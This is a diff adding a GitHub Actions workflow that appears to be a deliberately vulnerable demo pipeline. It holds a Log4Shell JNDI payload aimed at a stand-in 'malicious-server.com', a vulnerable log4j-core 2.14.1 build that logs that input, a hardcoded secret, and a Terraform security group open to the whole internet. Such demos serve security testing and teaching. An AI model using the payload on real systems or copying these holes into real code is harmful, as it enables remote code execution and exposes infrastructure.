@@ -1,0 +1,96 @@
+name: Vulnerable Pipeline Demo
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    env:
+      UNSAFE_INPUT: '${jndi:ldap://malicious-server.com/a}'
+      SECRET_KEY: 'hardcoded-super-secret-key'  # ❌ Hardcoded secret
+
+    steps:
+      - name: 📥 Checkout code
+        uses: actions/checkout@v3
+
+      - name: ⚙️ Set up Java
+        uses: actions/setup-java@v3
+        with:
+          distribution: 'temurin'
+          java-version: '11'
+
+      - name: 📦 Setup vulnerable Java project
+        run: |
+          mkdir log4j-demo && cd log4j-demo
+          cat <<EOF > pom.xml
+          <project xmlns="http://maven.apache.org/POM/4.0.0"
+                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
+                   http://maven.apache.org/xsd/maven-4.0.0.xsd">
+            <modelVersion>4.0.0</modelVersion>
+            <groupId>com.example</groupId>
+            <artifactId>vulnerable-log4j</artifactId>
+            <version>1.0</version>
+            <dependencies>
+              <dependency>
+                <groupId>org.apache.logging.log4j</groupId>
+                <artifactId>log4j-core</artifactId>
+                <version>2.14.1</version> <!-- vulnerable version -->
+              </dependency>
+            </dependencies>
+          </project>
+          EOF
+
+          cat <<EOF > Log4jVuln.java
+          import org.apache.logging.log4j.LogManager;
+          import org.apache.logging.log4j.Logger;
+
+          public class Log4jVuln {
+              static Logger logger = LogManager.getLogger(Log4jVuln.class);
+
+              public static void main(String[] args) {
+                  String input = System.getenv("UNSAFE_INPUT");
+                  logger.error("Log: " + input); // vulnerable sink
+              }
+          }
+          EOF
+
+      - name: 🔨 Compile & Run vulnerable app
+        working-directory: ./log4j-demo
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y maven
+          mvn compile exec:java -Dexec.mainClass=Log4jVuln
+
+  iac-misconfig:
+    runs-on: ubuntu-latest
+    steps:
+      - name: ⚠️ Simulate insecure IaC
+        run: |
+          mkdir terraform && cd terraform
+          cat <<EOF > insecure.tf
+          provider "aws" {
+            region = "us-east-1"
+          }
+
+          resource "aws_security_group" "allow_all" {
+            name        = "allow_all"
+            description = "Open to the world"
+            ingress {
+              from_port   = 0
+              to_port     = 65535
+              protocol    = "tcp"
+              cidr_blocks = ["0.0.0.0/0"]
+            }
+            egress {
+              from_port   = 0
+              to_port     = 0
+              protocol    = "-1"
+              cidr_blocks = ["0.0.0.0/0"]
+            }
+          }
+          EOF
